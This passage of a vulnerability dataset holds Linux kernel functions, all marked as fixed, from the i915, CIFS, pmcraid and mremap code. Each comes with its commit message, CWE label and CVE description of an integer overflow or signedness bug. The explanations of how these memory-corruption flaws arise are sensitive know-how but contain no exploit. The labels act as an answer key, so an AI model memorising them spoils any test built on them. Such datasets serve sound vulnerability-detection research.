I915_EXEC_CONSTANTS_ABSOLUTE:\n\tcase I915_EXEC_CONSTANTS_REL_SURFACE:\n\t\tif (ring == &dev_priv->ring[RCS] &&\n\t\t    mode != dev_priv->relative_constants_mode) {\n\t\t\tif (INTEL_INFO(dev)->gen < 4)\n\t\t\t\treturn -EINVAL;\n\n\t\t\tif (INTEL_INFO(dev)->gen > 5 &&\n\t\t\t    mode == I915_EXEC_CONSTANTS_REL_SURFACE)\n\t\t\t\treturn -EINVAL;\n\n\t\t\t/* The HW changed the meaning on this bit on gen6 */\n\t\t\tif (INTEL_INFO(dev)->gen >= 6)\n\t\t\t\tmask &= ~I915_EXEC_CONSTANTS_REL_SURFACE;\n\t\t}\n\t\tbreak;\n\tdefault:\n\t\tDRM_DEBUG(\"execbuf with unknown constants: %d\\n\", mode);\n\t\treturn -EINVAL;\n\t}\n\n\tif (args->buffer_count < 1) {\n\t\tDRM_DEBUG(\"execbuf with %d buffers\\n\", args->buffer_count);\n\t\treturn -EINVAL;\n\t}\n\n\tif (args->num_cliprects != 0) {\n\t\tif (ring != &dev_priv->ring[RCS]) {\n\t\t\tDRM_DEBUG(\"clip rectangles are only valid with the render ring\\n\");\n \t\t\treturn -EINVAL;\n \t\t}\n \n\t\tif (args->num_cliprects > UINT_MAX / sizeof(*cliprects)) {\n\t\t\tDRM_DEBUG(\"execbuf with %u cliprects\\n\",\n\t\t\t\t  args->num_cliprects);\n\t\t\treturn -EINVAL;\n\t\t}\n \t\tcliprects = kmalloc(args->num_cliprects * sizeof(*cliprects),\n \t\t\t\t    GFP_KERNEL);\n \t\tif (cliprects == NULL) {\n\t\t\tret = -ENOMEM;\n\t\t\tgoto pre_mutex_err;\n\t\t}\n\n\t\tif (copy_from_user(cliprects,\n\t\t\t\t     (struct drm_clip_rect __user *)(uintptr_t)\n\t\t\t\t     args->cliprects_ptr,\n\t\t\t\t     sizeof(*cliprects)*args->num_cliprects)) {\n\t\t\tret = -EFAULT;\n\t\t\tgoto pre_mutex_err;\n\t\t}\n\t}\n\n\tret = i915_mutex_lock_interruptible(dev);\n\tif (ret)\n\t\tgoto pre_mutex_err;\n\n\tif (dev_priv->mm.suspended) {\n\t\tmutex_unlock(&dev->struct_mutex);\n\t\tret = -EBUSY;\n\t\tgoto pre_mutex_err;\n\t}\n\n\teb = eb_create(args->buffer_count);\n\tif (eb == NULL) {\n\t\tmutex_unlock(&dev->struct_mutex);\n\t\tret = -ENOMEM;\n\t\tgoto pre_mutex_err;\n\t}\n\n\t/* Look up object handles */\n\tINIT_LIST_HEAD(&objects);\n\tfor (i = 0; i < args->buffer_count; i++) {\n\t\tstruct drm_i915_gem_object *obj;\n\n\t\tobj = to_intel_bo(drm_gem_object_lookup(dev, file,\n\t\t\t\t\t\t\texec[i].handle));\n\t\tif (&obj->base == NULL) {\n\t\t\tDRM_DEBUG(\"Invalid object handle %d at index %d\\n\",\n\t\t\t\t   exec[i].handle, i);\n\t\t\t/* prevent error path from reading uninitialized data */\n\t\t\tret = -ENOENT;\n\t\t\tgoto err;\n\t\t}\n\n\t\tif (!list_empty(&obj->exec_list)) {\n\t\t\tDRM_DEBUG(\"Object %p [handle %d, index %d] appears more than once in object list\\n\",\n\t\t\t\t   obj, exec[i].handle, i);\n\t\t\tret = -EINVAL;\n\t\t\tgoto err;\n\t\t}\n\n\t\tlist_add_tail(&obj->exec_list, &objects);\n\t\tobj->exec_handle = exec[i].handle;\n\t\tobj->exec_entry = &exec[i];\n\t\teb_add_object(eb, obj);\n\t}\n\n\t/* take note of the batch buffer before we might reorder the lists */\n\tbatch_obj = list_entry(objects.prev,\n\t\t\t       struct drm_i915_gem_object,\n\t\t\t       exec_list);\n\n\t/* Move the objects en-masse into the GTT, evicting if necessary. */\n\tret = i915_gem_execbuffer_reserve(ring, file, &objects);\n\tif (ret)\n\t\tgoto err;\n\n\t/* The objects are in their final locations, apply the relocations. */\n\tret = i915_gem_execbuffer_relocate(dev, eb, &objects);\n\tif (ret) {\n\t\tif (ret == -EFAULT) {\n\t\t\tret = i915_gem_execbuffer_relocate_slow(dev, file, ring,\n\t\t\t\t\t\t\t\t&objects, eb,\n\t\t\t\t\t\t\t\texec,\n\t\t\t\t\t\t\t\targs->buffer_count);\n\t\t\tBUG_ON(!mutex_is_locked(&dev->struct_mutex));\n\t\t}\n\t\tif (ret)\n\t\t\tgoto err;\n\t}\n\n\t/* Set the pending read domains for the batch buffer to COMMAND */\n\tif (batch_obj->base.pending_write_domain) {\n\t\tDRM_DEBUG(\"Attempting to use self-modifying batch buffer\\n\");\n\t\tret = -EINVAL;\n\t\tgoto err;\n\t}\n\tbatch_obj->base.pending_read_domains |= I915_GEM_DOMAIN_COMMAND;\n\n\tret = i915_gem_execbuffer_move_to_gpu(ring, &objects);\n\tif (ret)\n\t\tgoto err;\n\n\tseqno = i915_gem_next_request_seqno(ring);\n\tfor (i = 0; i < ARRAY_SIZE(ring->sync_seqno); i++) {\n\t\tif (seqno < ring->sync_seqno[i]) {\n\t\t\t/* The GPU can not handle its semaphore value wrapping,\n\t\t\t * so every billion or so execbuffers, we need to stall\n\t\t\t * the GPU in order to reset the counters.\n\t\t\t */\n\t\t\tret = i915_gpu_idle(dev, true);\n\t\t\tif (ret)\n\t\t\t\tgoto err;\n\n\t\t\tBUG_ON(ring->sync_seqno[i]);\n\t\t}\n\t}\n\n\tif (ring == &dev_priv->ring[RCS] &&\n\t    mode != dev_priv->relative_constants_mode) {\n\t\tret = intel_ring_begin(ring, 4);\n\t\tif (ret)\n\t\t\t\tgoto err;\n\n\t\tintel_ring_emit(ring, MI_NOOP);\n\t\tintel_ring_emit(ring, MI_LOAD_REGISTER_IMM(1));\n\t\tintel_ring_emit(ring, INSTPM);\n\t\tintel_ring_emit(ring, mask << 16 | mode);\n\t\tintel_ring_advance(ring);\n\n\t\tdev_priv->relative_constants_mode = mode;\n\t}\n\n\tif (args->flags & I915_EXEC_GEN7_SOL_RESET) {\n\t\tret = i915_reset_gen7_sol_offsets(dev, ring);\n\t\tif (ret)\n\t\t\tgoto err;\n\t}\n\n\ttrace_i915_gem_ring_dispatch(ring, seqno);\n\n\texec_start = batch_obj->gtt_offset + args->batch_start_offset;\n\texec_len = args->batch_len;\n\tif (cliprects) {\n\t\tfor (i = 0; i < args->num_cliprects; i++) {\n\t\t\tret = i915_emit_box(dev, &cliprects[i],\n\t\t\t\t\t    args->DR1, args->DR4);\n\t\t\tif (ret)\n\t\t\t\tgoto err;\n\n\t\t\tret = ring->dispatch_execbuffer(ring,\n\t\t\t\t\t\t\texec_start, exec_len);\n\t\t\tif (ret)\n\t\t\t\tgoto err;\n\t\t}\n\t} else {\n\t\tret = ring->dispatch_execbuffer(ring, exec_start, exec_len);\n\t\tif (ret)\n\t\t\tgoto err;\n\t}\n\n\ti915_gem_execbuffer_move_to_active(&objects, ring, seqno);\n\ti915_gem_execbuffer_retire_commands(dev, file, ring);\n\nerr:\n\teb_destroy(eb);\n\twhile (!list_empty(&objects)) {\n\t\tstruct drm_i915_gem_object *obj;\n\n\t\tobj = list_first_entry(&objects,\n\t\t\t\t       struct drm_i915_gem_object,\n\t\t\t\t       exec_list);\n\t\tlist_del_init(&obj->exec_list);\n\t\tdrm_gem_object_unreference(&obj->base);\n\t}\n\n\tmutex_unlock(&dev->struct_mutex);\n\npre_mutex_err:\n\tkfree(cliprects);\n\treturn ret;\n}\n", "func_hash": 331658217081478298945109689650940612129, "file_name": "i915_gem_execbuffer.c", "file_hash": 259959757549234845087885974252862936419, "cwe": ["CWE-189"], "cve": "CVE-2012-2384", "cve_desc": "Integer overflow in the i915_gem_do_execbuffer function in drivers/gpu/drm/i915/i915_gem_execbuffer.c in the Direct Rendering Manager (DRM) subsystem in the Linux kernel before 3.3.5 on 32-bit platforms allows local users to cause a denial of service (out-of-bounds write) or possibly have unspecified other impact via a crafted ioctl call.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-2384"}
{"idx": 184357, "project": "linux", "commit_id": "9438fabb73eb48055b58b89fc51e0bc4db22fabd", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/9438fabb73eb48055b58b89fc51e0bc4db22fabd", "commit_message": "cifs: fix possible memory corruption in CIFSFindNext\n\nThe name_len variable in CIFSFindNext is a signed int that gets set to\nthe resume_name_len in the cifs_search_info. The resume_name_len however\nis unsigned and for some infolevels is populated directly from a 32 bit\nvalue sent by the server.\n\nIf the server sends a very large value for this, then that value could\nlook negative when converted to a signed int. That would make that\nvalue pass the PATH_MAX check later in CIFSFindNext. The name_len would\nthen be used as a length value for a memcpy. It would then be treated\nas unsigned again, and the memcpy scribbles over a ton of memory.\n\nFix this by making the name_len an unsigned value in CIFSFindNext.\n\nCc: <stable@kernel.org>\nReported-by: Darren Lavender <dcl@hppine99.gbr.hp.com>\nSigned-off-by: Jeff Layton <jlayton@redhat.com>\nSigned-off-by: Steve French <sfrench@us.ibm.com>", "target": 0, "func": "int CIFSFindNext(const int xid, struct cifs_tcon *tcon,\n\t\t __u16 searchHandle, struct cifs_search_info *psrch_inf)\n{\n\tTRANSACTION2_FNEXT_REQ *pSMB = NULL;\n\tTRANSACTION2_FNEXT_RSP *pSMBr = NULL;\n \tT2_FNEXT_RSP_PARMS *parms;\n \tchar *response_data;\n \tint rc = 0;\n\tint bytes_returned;\n\tunsigned int name_len;\n \t__u16 params, byte_count;\n \n \tcFYI(1, \"In FindNext\");\n\n\tif (psrch_inf->endOfSearch)\n\t\treturn -ENOENT;\n\n\trc = smb_init(SMB_COM_TRANSACTION2, 15, tcon, (void **) &pSMB,\n\t\t(void **) &pSMBr);\n\tif (rc)\n\t\treturn rc;\n\n\tparams = 14; /* includes 2 bytes of null string, converted to LE below*/\n\tbyte_count = 0;\n\tpSMB->TotalDataCount = 0;       /* no EAs */\n\tpSMB->MaxParameterCount = cpu_to_le16(8);\n\tpSMB->MaxDataCount =\n\t\tcpu_to_le16((tcon->ses->server->maxBuf - MAX_CIFS_HDR_SIZE) &\n\t\t\t\t0xFFFFFF00);\n\tpSMB->MaxSetupCount = 0;\n\tpSMB->Reserved = 0;\n\tpSMB->Flags = 0;\n\tpSMB->Timeout = 0;\n\tpSMB->Reserved2 = 0;\n\tpSMB->ParameterOffset =  cpu_to_le16(\n\t      offsetof(struct smb_com_transaction2_fnext_req,SearchHandle) - 4);\n\tpSMB->DataCount = 0;\n\tpSMB->DataOffset = 0;\n\tpSMB->SetupCount = 1;\n\tpSMB->Reserved3 = 0;\n\tpSMB->SubCommand = cpu_to_le16(TRANS2_FIND_NEXT);\n\tpSMB->SearchHandle = searchHandle;      /* always kept as le */\n\tpSMB->SearchCount =\n\t\tcpu_to_le16(CIFSMaxBufSize / sizeof(FILE_UNIX_INFO));\n\tpSMB->InformationLevel = cpu_to_le16(psrch_inf->info_level);\n\tpSMB->ResumeKey = psrch_inf->resume_key;\n\tpSMB->SearchFlags =\n\t      cpu_to_le16(CIFS_SEARCH_CLOSE_AT_END | CIFS_SEARCH_RETURN_RESUME);\n\n\tname_len = psrch_inf->resume_name_len;\n\tparams += name_len;\n\tif (name_len < PATH_MAX) {\n\t\tmemcpy(pSMB->ResumeFileName, psrch_inf->presume_name, name_len);\n\t\tbyte_count += name_len;\n\t\t/* 14 byte parm len above enough for 2 byte null terminator */\n\t\tpSMB->ResumeFileName[name_len] = 0;\n\t\tpSMB->ResumeFileName[name_len+1] = 0;\n\t} else {\n\t\trc = -EINVAL;\n\t\tgoto FNext2_err_exit;\n\t}\n\tbyte_count = params + 1 /* pad */ ;\n\tpSMB->TotalParameterCount = cpu_to_le16(params);\n\tpSMB->ParameterCount = pSMB->TotalParameterCount;\n\tinc_rfc1001_len(pSMB, byte_count);\n\tpSMB->ByteCount = cpu_to_le16(byte_count);\n\n\trc = SendReceive(xid, tcon->ses, (struct smb_hdr *) pSMB,\n\t\t\t(struct smb_hdr *) pSMBr, &bytes_returned, 0);\n\tcifs_stats_inc(&tcon->num_fnext);\n\tif (rc) {\n\t\tif (rc == -EBADF) {\n\t\t\tpsrch_inf->endOfSearch = true;\n\t\t\tcifs_buf_release(pSMB);\n\t\t\trc = 0; /* search probably was closed at end of search*/\n\t\t} else\n\t\t\tcFYI(1, \"FindNext returned = %d\", rc);\n\t} else {                /* decode response */\n\t\trc = validate_t2((struct smb_t2_rsp *)pSMBr);\n\n\t\tif (rc == 0) {\n\t\t\tunsigned int lnoff;\n\n\t\t\t/* BB fixme add lock for file (srch_info) struct here */\n\t\t\tif (pSMBr->hdr.Flags2 & SMBFLG2_UNICODE)\n\t\t\t\tpsrch_inf->unicode = true;\n\t\t\telse\n\t\t\t\tpsrch_inf->unicode = false;\n\t\t\tresponse_data = (char *) &pSMBr->hdr.Protocol +\n\t\t\t       le16_to_cpu(pSMBr->t2.ParameterOffset);\n\t\t\tparms = (T2_FNEXT_RSP_PARMS *)response_data;\n\t\t\tresponse_data = (char *)&pSMBr->hdr.Protocol +\n\t\t\t\tle16_to_cpu(pSMBr->t2.DataOffset);\n\t\t\tif (psrch_inf->smallBuf)\n\t\t\t\tcifs_small_buf_release(\n\t\t\t\t\tpsrch_inf->ntwrk_buf_start);\n\t\t\telse\n\t\t\t\tcifs_buf_release(psrch_inf->ntwrk_buf_start);\n\t\t\tpsrch_inf->srch_entries_start = response_data;\n\t\t\tpsrch_inf->ntwrk_buf_start = (char *)pSMB;\n\t\t\tpsrch_inf->smallBuf = 0;\n\t\t\tif (parms->EndofSearch)\n\t\t\t\tpsrch_inf->endOfSearch = true;\n\t\t\telse\n\t\t\t\tpsrch_inf->endOfSearch = false;\n\t\t\tpsrch_inf->entries_in_buffer =\n\t\t\t\t\t\tle16_to_cpu(parms->SearchCount);\n\t\t\tpsrch_inf->index_of_last_entry +=\n\t\t\t\tpsrch_inf->entries_in_buffer;\n\t\t\tlnoff = le16_to_cpu(parms->LastNameOffset);\n\t\t\tif (tcon->ses->server->maxBuf - MAX_CIFS_HDR_SIZE <\n\t\t\t      lnoff) {\n\t\t\t\tcERROR(1, \"ignoring corrupt resume name\");\n\t\t\t\tpsrch_inf->last_entry = NULL;\n\t\t\t\treturn rc;\n\t\t\t} else\n\t\t\t\tpsrch_inf->last_entry =\n\t\t\t\t\tpsrch_inf->srch_entries_start + lnoff;\n\n/*  cFYI(1, \"fnxt2 entries in buf %d index_of_last %d\",\n\t    psrch_inf->entries_in_buffer, psrch_inf->index_of_last_entry); */\n\n\t\t\t/* BB fixme add unlock here */\n\t\t}\n\n\t}\n\n\t/* BB On error, should we leave previous search buf (and count and\n\tlast entry fields) intact or free the previous one? */\n\n\t/* Note: On -EAGAIN error only caller can retry on handle based calls\n\tsince file handle passed in no longer valid */\nFNext2_err_exit:\n\tif (rc != 0)\n\t\tcifs_buf_release(pSMB);\n\treturn rc;\n}\n", "func_hash": 199510093665953183137441330965789355440, "file_name": "cifssmb.c", "file_hash": 26433589528345729127329209952904704679, "cwe": ["CWE-189"], "cve": "CVE-2011-3191", "cve_desc": "Integer signedness error in the CIFSFindNext function in fs/cifs/cifssmb.c in the Linux kernel before 3.1 allows remote CIFS servers to cause a denial of service (memory corruption) or possibly have unspecified other impact via a large length value in a response to a read request for a directory.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-3191"}
{"idx": 184366, "project": "linux", "commit_id": "b5b515445f4f5a905c5dd27e6e682868ccd6c09d", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/b5b515445f4f5a905c5dd27e6e682868ccd6c09d", "commit_message": "[SCSI] pmcraid: reject negative request size\n\nThere's a code path in pmcraid that can be reached via device ioctl that\ncauses all sorts of ugliness, including heap corruption or triggering the\nOOM killer due to consecutive allocation of large numbers of pages.\n\nFirst, the user can call pmcraid_chr_ioctl(), with a type\nPMCRAID_PASSTHROUGH_IOCTL.  This calls through to\npmcraid_ioctl_passthrough().  Next, a pmcraid_passthrough_ioctl_buffer\nis copied in, and the request_size variable is set to\nbuffer->ioarcb.data_transfer_length, which is an arbitrary 32-bit\nsigned value provided by the user.  If a negative value is provided\nhere, bad things can happen.  For example,\npmcraid_build_passthrough_ioadls() is called with this request_size,\nwhich immediately calls pmcraid_alloc_sglist() with a negative size.\nThe resulting math on allocating a scatter list can result in an\noverflow in the kzalloc() call (if num_elem is 0, the sglist will be\nsmaller than expected), or if num_elem is unexpectedly large the\nsubsequent loop will call alloc_pages() repeatedly, a high number of\npages will be allocated and the OOM killer might be invoked.\n\nIt looks like preventing this value from being negative in\npmcraid_ioctl_passthrough() would be sufficient.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com>\nCc: <stable@kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: James Bottomley <JBottomley@Parallels.com>", "target": 0, "func": "static long pmcraid_ioctl_passthrough(\n\tstruct pmcraid_instance *pinstance,\n\tunsigned int ioctl_cmd,\n\tunsigned int buflen,\n\tunsigned long arg\n)\n{\n\tstruct pmcraid_passthrough_ioctl_buffer *buffer;\n\tstruct pmcraid_ioarcb *ioarcb;\n\tstruct pmcraid_cmd *cmd;\n\tstruct pmcraid_cmd *cancel_cmd;\n\tunsigned long request_buffer;\n\tunsigned long request_offset;\n\tunsigned long lock_flags;\n\tvoid *ioasa;\n\tu32 ioasc;\n\tint request_size;\n\tint buffer_size;\n\tu8 access, direction;\n\tint rc = 0;\n\n\t/* If IOA reset is in progress, wait 10 secs for reset to complete */\n\tif (pinstance->ioa_reset_in_progress) {\n\t\trc = wait_event_interruptible_timeout(\n\t\t\t\tpinstance->reset_wait_q,\n\t\t\t\t!pinstance->ioa_reset_in_progress,\n\t\t\t\tmsecs_to_jiffies(10000));\n\n\t\tif (!rc)\n\t\t\treturn -ETIMEDOUT;\n\t\telse if (rc < 0)\n\t\t\treturn -ERESTARTSYS;\n\t}\n\n\t/* If adapter is not in operational state, return error */\n\tif (pinstance->ioa_state != IOA_STATE_OPERATIONAL) {\n\t\tpmcraid_err(\"IOA is not operational\\n\");\n\t\treturn -ENOTTY;\n\t}\n\n\tbuffer_size = sizeof(struct pmcraid_passthrough_ioctl_buffer);\n\tbuffer = kmalloc(buffer_size, GFP_KERNEL);\n\n\tif (!buffer) {\n\t\tpmcraid_err(\"no memory for passthrough buffer\\n\");\n\t\treturn -ENOMEM;\n\t}\n\n\trequest_offset =\n\t    offsetof(struct pmcraid_passthrough_ioctl_buffer, request_buffer);\n\n\trequest_buffer = arg + request_offset;\n\n\trc = __copy_from_user(buffer,\n\t\t\t     (struct pmcraid_passthrough_ioctl_buffer *) arg,\n\t\t\t     sizeof(struct pmcraid_passthrough_ioctl_buffer));\n\n\tioasa =\n\t(void *)(arg +\n\t\toffsetof(struct pmcraid_passthrough_ioctl_buffer, ioasa));\n\n\tif (rc) {\n\t\tpmcraid_err(\"ioctl: can't copy passthrough buffer\\n\");\n\t\trc = -EFAULT;\n\t\tgoto out_free_buffer;\n\t}\n\n\trequest_size = buffer->ioarcb.data_transfer_length;\n\n\tif (buffer->ioarcb.request_flags0 & TRANSFER_DIR_WRITE) {\n\t\taccess = VERIFY_READ;\n\t\tdirection = DMA_TO_DEVICE;\n\t} else {\n\t\taccess = VERIFY_WRITE;\n\t\tdirection = DMA_FROM_DEVICE;\n\t}\n\n\tif (request_size > 0) {\n\t\trc = access_ok(access, arg, request_offset + request_size);\n\n\t\tif (!rc) {\n\t\t\trc = -EFAULT;\n\t\t\tgoto out_free_buffer;\n\t\t}\n\t} else if (request_size < 0) {\n\t\trc = -EINVAL;\n\t\tgoto out_free_buffer;\n\t}\n\n\t/* check if we have any additional command parameters */\n\tif (buffer->ioarcb.add_cmd_param_length > PMCRAID_ADD_CMD_PARAM_LEN) {\n\t\trc = -EINVAL;\n\t\tgoto out_free_buffer;\n\t}\n\n\tcmd = pmcraid_get_free_cmd(pinstance);\n\n\tif (!cmd) {\n\t\tpmcraid_err(\"free command block is not available\\n\");\n\t\trc = -ENOMEM;\n\t\tgoto out_free_buffer;\n\t}\n\n\tcmd->scsi_cmd = NULL;\n\tioarcb = &(cmd->ioa_cb->ioarcb);\n\n\t/* Copy the user-provided IOARCB stuff field by field */\n\tioarcb->resource_handle = buffer->ioarcb.resource_handle;\n\tioarcb->data_transfer_length = buffer->ioarcb.data_transfer_length;\n\tioarcb->cmd_timeout = buffer->ioarcb.cmd_timeout;\n\tioarcb->request_type = buffer->ioarcb.request_type;\n\tioarcb->request_flags0 = buffer->ioarcb.request_flags0;\n\tioarcb->request_flags1 = buffer->ioarcb.request_flags1;\n\tmemcpy(ioarcb->cdb, buffer->ioarcb.cdb, PMCRAID_MAX_CDB_LEN);\n\n\tif (buffer->ioarcb.add_cmd_param_length) {\n\t\tioarcb->add_cmd_param_length =\n\t\t\tbuffer->ioarcb.add_cmd_param_length;\n\t\tioarcb->add_cmd_param_offset =\n\t\t\tbuffer->ioarcb.add_cmd_param_offset;\n\t\tmemcpy(ioarcb->add_data.u.add_cmd_params,\n\t\t\tbuffer->ioarcb.add_data.u.add_cmd_params,\n\t\t\tbuffer->ioarcb.add_cmd_param_length);\n\t}\n\n\t/* set hrrq number where the IOA should respond to. Note that all cmds\n\t * generated internally uses hrrq_id 0, exception to this is the cmd\n\t * block of scsi_cmd which is re-used (e.g. cancel/abort), which uses\n\t * hrrq_id assigned here in queuecommand\n\t */\n\tioarcb->hrrq_id = atomic_add_return(1, &(pinstance->last_message_id)) %\n\t\t\t  pinstance->num_hrrq;\n\n\tif (request_size) {\n\t\trc = pmcraid_build_passthrough_ioadls(cmd,\n\t\t\t\t\t\t      request_size,\n\t\t\t\t\t\t      direction);\n\t\tif (rc) {\n \t\t\tpmcraid_err(\"couldn't build passthrough ioadls\\n\");\n \t\t\tgoto out_free_buffer;\n \t\t}\n\t} else if (request_size < 0) {\n\t\trc = -EINVAL;\n\t\tgoto out_free_buffer;\n \t}\n \n \t/* If data is being written into the device, copy the data from user\n\t * buffers\n\t */\n\tif (direction == DMA_TO_DEVICE && request_size > 0) {\n\t\trc = pmcraid_copy_sglist(cmd->sglist,\n\t\t\t\t\t request_buffer,\n\t\t\t\t\t request_size,\n\t\t\t\t\t direction);\n\t\tif (rc) {\n\t\t\tpmcraid_err(\"failed to copy user buffer\\n\");\n\t\t\tgoto out_free_sglist;\n\t\t}\n\t}\n\n\t/* passthrough ioctl is a blocking command so, put the user to sleep\n\t * until timeout. Note that a timeout value of 0 means, do timeout.\n\t */\n\tcmd->cmd_done = pmcraid_internal_done;\n\tinit_completion(&cmd->wait_for_completion);\n\tcmd->completion_req = 1;\n\n\tpmcraid_info(\"command(%d) (CDB[0] = %x) for %x\\n\",\n\t\t     le32_to_cpu(cmd->ioa_cb->ioarcb.response_handle) >> 2,\n\t\t     cmd->ioa_cb->ioarcb.cdb[0],\n\t\t     le32_to_cpu(cmd->ioa_cb->ioarcb.resource_handle));\n\n\tspin_lock_irqsave(pinstance->host->host_lock, lock_flags);\n\t_pmcraid_fire_command(cmd);\n\tspin_unlock_irqrestore(pinstance->host->host_lock, lock_flags);\n\n\t/* NOTE ! Remove the below line once abort_task is implemented\n\t * in firmware. This line disables ioctl command timeout handling logic\n\t * similar to IO command timeout handling, making ioctl commands to wait\n\t * until the command completion regardless of timeout value specified in\n\t * ioarcb\n\t */\n\tbuffer->ioarcb.cmd_timeout = 0;\n\n\t/* If command timeout is specified put caller to wait till that time,\n\t * otherwise it would be blocking wait. If command gets timed out, it\n\t * will be aborted.\n\t */\n\tif (buffer->ioarcb.cmd_timeout == 0) {\n\t\twait_for_completion(&cmd->wait_for_completion);\n\t} else if (!wait_for_completion_timeout(\n\t\t\t&cmd->wait_for_completion,\n\t\t\tmsecs_to_jiffies(buffer->ioarcb.cmd_timeout * 1000))) {\n\n\t\tpmcraid_info(\"aborting cmd %d (CDB[0] = %x) due to timeout\\n\",\n\t\t\tle32_to_cpu(cmd->ioa_cb->ioarcb.response_handle >> 2),\n\t\t\tcmd->ioa_cb->ioarcb.cdb[0]);\n\n\t\tspin_lock_irqsave(pinstance->host->host_lock, lock_flags);\n\t\tcancel_cmd = pmcraid_abort_cmd(cmd);\n\t\tspin_unlock_irqrestore(pinstance->host->host_lock, lock_flags);\n\n\t\tif (cancel_cmd) {\n\t\t\twait_for_completion(&cancel_cmd->wait_for_completion);\n\t\t\tioasc = cancel_cmd->ioa_cb->ioasa.ioasc;\n\t\t\tpmcraid_return_cmd(cancel_cmd);\n\n\t\t\t/* if abort task couldn't find the command i.e it got\n\t\t\t * completed prior to aborting, return good completion.\n\t\t\t * if command got aborted successfully or there was IOA\n\t\t\t * reset due to abort task itself getting timedout then\n\t\t\t * return -ETIMEDOUT\n\t\t\t */\n\t\t\tif (ioasc == PMCRAID_IOASC_IOA_WAS_RESET ||\n\t\t\t    PMCRAID_IOASC_SENSE_KEY(ioasc) == 0x00) {\n\t\t\t\tif (ioasc != PMCRAID_IOASC_GC_IOARCB_NOTFOUND)\n\t\t\t\t\trc = -ETIMEDOUT;\n\t\t\t\tgoto out_handle_response;\n\t\t\t}\n\t\t}\n\n\t\t/* no command block for abort task or abort task failed to abort\n\t\t * the IOARCB, then wait for 150 more seconds and initiate reset\n\t\t * sequence after timeout\n\t\t */\n\t\tif (!wait_for_completion_timeout(\n\t\t\t&cmd->wait_for_completion,\n\t\t\tmsecs_to_jiffies(150 * 1000))) {\n\t\t\tpmcraid_reset_bringup(cmd->drv_inst);\n\t\t\trc = -ETIMEDOUT;\n\t\t}\n\t}\n\nout_handle_response:\n\t/* copy entire IOASA buffer and return IOCTL success.\n\t * If copying IOASA to user-buffer fails, return\n\t * EFAULT\n\t */\n\tif (copy_to_user(ioasa, &cmd->ioa_cb->ioasa,\n\t\tsizeof(struct pmcraid_ioasa))) {\n\t\tpmcraid_err(\"failed to copy ioasa buffer to user\\n\");\n\t\trc = -EFAULT;\n\t}\n\n\t/* If the data transfer was from device, copy the data onto user\n\t * buffers\n\t */\n\telse if (direction == DMA_FROM_DEVICE && request_size > 0) {\n\t\trc = pmcraid_copy_sglist(cmd->sglist,\n\t\t\t\t\t request_buffer,\n\t\t\t\t\t request_size,\n\t\t\t\t\t direction);\n\t\tif (rc) {\n\t\t\tpmcraid_err(\"failed to copy user buffer\\n\");\n\t\t\trc = -EFAULT;\n\t\t}\n\t}\n\nout_free_sglist:\n\tpmcraid_release_passthrough_ioadls(cmd, request_size, direction);\n\tpmcraid_return_cmd(cmd);\n\nout_free_buffer:\n\tkfree(buffer);\n\n\treturn rc;\n}\n", "func_hash": 82163326830447769756885920491727513617, "file_name": "pmcraid.c", "file_hash": 5320847727715775618270750353598115908, "cwe": ["CWE-189"], "cve": "CVE-2011-2906", "cve_desc": "Integer signedness error in the pmcraid_ioctl_passthrough function in drivers/scsi/pmcraid.c in the Linux kernel before 3.1 might allow local users to cause a denial of service (memory consumption or memory corruption) via a negative size value in an ioctl call. NOTE: this may be a vulnerability only in unusual environments that provide a privileged program for obtaining the required file descriptor.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-2906"}
{"idx": 184370, "project": "linux", "commit_id": "982134ba62618c2d69fbbbd166d0a11ee3b7e3d8", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/982134ba62618c2d69fbbbd166d0a11ee3b7e3d8", "commit_message": "mm: avoid wrapping vm_pgoff in mremap()\n\nThe normal mmap paths all avoid creating a mapping where the pgoff\ninside the mapping could wrap around due to overflow.  However, an\nexpanding mremap() can take such a non-wrapping mapping and make it\nbigger and cause a wrapping condition.\n\nNoticed by Robert Swiecki when running a system call fuzzer, where it\ncaused a BUG_ON() due to terminally confusing the vma_prio_tree code.  A\nvma dumping patch by Hugh then pinpointed the crazy wrapped case.\n\nReported-and-tested-by: Robert Swiecki <robert@swiecki.net>\nAcked-by: Hugh Dickins <hughd@google.com>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>", "target": 0, "func": "static struct vm_area_struct *vma_to_resize(unsigned long addr,\n\tunsigned long old_len, unsigned long new_len, unsigned long *p)\n{\n\tstruct mm_struct *mm = current->mm;\n\tstruct vm_area_struct *vma = find_vma(mm, addr);\n\n\tif (!vma || vma->vm_start > addr)\n\t\tgoto Efault;\n\n\tif (is_vm_hugetlb_page(vma))\n\t\tgoto Einval;\n\n\t/* We can't remap across vm area boundaries */\n \tif (old_len > vma->vm_end - addr)\n \t\tgoto Efault;\n \n\t/* Need to be careful about a growing mapping */\n\tif (new_len > old_len) {\n\t\tunsigned long pgoff;\n\n\t\tif (vma->vm_flags & (VM_DONTEXPAND | VM_PFNMAP))\n \t\t\tgoto Efault;\n\t\tpgoff = (addr - vma->vm_start) >> PAGE_SHIFT;\n\t\tpgoff += vma->vm_pgoff;\n\t\tif (pgoff + (new_len >> PAGE_SHIFT) < pgoff)\n\t\t\tgoto Einval;\n \t}\n \n \tif (vma->vm_flags & VM_LOCKED) {\n\t\tunsigned long locked, lock_limit;\n\t\tlocked = mm->locked_vm << PAGE_SHIFT;\n\t\tlock_limit = rlimit(RLIMIT_MEMLOCK);\n\t\tlocked += new_len - old_len;\n\t\tif (locked > lock_limit && !capable(CAP_IPC_LOCK))\n\t\t\tgoto Eagain;\n\t}\n\n\tif (!may_expand_vm(mm, (new_len - old_len) >> PAGE_SHIFT))\n\t\tgoto Enomem;\n\n\tif (vma->vm_flags & VM_ACCOUNT) {\n\t\tunsigned long charged = (new_len - old_len) >> PAGE_SHIFT;\n\t\tif (security_vm_enough_memory(charged))\n\t\t\tgoto Efault;\n\t\t*p = charged;\n\t}\n\n\treturn vma;\n\nEfault:\t/* very odd choice for most of the cases, but... */\n\treturn 